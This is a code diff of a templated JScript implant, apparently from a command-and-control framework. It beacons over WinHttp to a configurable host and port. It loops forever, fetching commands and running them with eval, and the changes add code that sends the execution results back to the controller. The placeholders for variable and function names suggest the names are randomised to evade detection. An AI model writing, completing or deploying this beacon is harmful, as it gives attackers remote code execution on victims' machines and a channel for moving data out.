@@ -9,7 +9,7 @@ var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
 
 var {{variables['username'][0]}} = {{variables['username'][1]}}
 
-function {{functions['post_req'][0]}}(data){
+function {{functions['post_req']}}(data){
   var {{variables['winhttp.winhttprequest'][0]}} = {{variables['winhttp.winhttprequest'][1]}}
   {{variables['winhttp.winhttprequest'][0]}}.Open('Post', 'http://{{variables['host'][1]}}:{{variables['port'][1]}}{{checkin_uri}}');
   {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("User-Agent", "{{variables['useragent'][1]}}");
@@ -20,34 +20,18 @@ function {{functions['post_req'][0]}}(data){
   return {{variables['winhttp.winhttprequest'][0]}}.ResponseText;
 }
 
-function base64_decode(data) {
-  var xml = new ActiveXObject("Microsoft.XMLDOM");
-  var element = xml.createElement("temp_file");
-  element.dataType = "bin.base64"
-  element.text = data
-
-  var stream = WScript.CreateObject("ADODB.Stream");
-  stream.Type = 1;
-  stream.open();
-  stream.Write(element.nodeTypedValue)
-
-  stream.Position = 0;
-  stream.Type = 2;
-  stream.CharSet = "utf-8";
-
-  result = stream.ReadText();
-  stream.close()
-  return result
-}
-
 while(true){
-  response = {{functions['post_req'][0]}}('{"connection_id":"'+{{connection_id[0]}}+'"}');
+  sleep = '3000'
+  response = {{functions['post_req']}}('{"connection_id":"'+{{connection_id[0]}}+'"}');
   var start = response.search('{')
   var end = response.search('}')
   json_data = "{" + response.substring(start+1, end) + "}"
   eval("command = " + json_data)
   if(command.eval){
-    eval(base64_decode(command.eval));
+    results = eval(unescape(command.eval));
+    if(results){
+      {{functions['post_req']}}('{' + '"connection_id"' + ':"' + {{connection_id[0]}} + '",' + '"results"' + ':"' + escape(results) + '"}');
+    }
   }
-  WScript.Sleep('3000')
+  WScript.Sleep(sleep)
 }
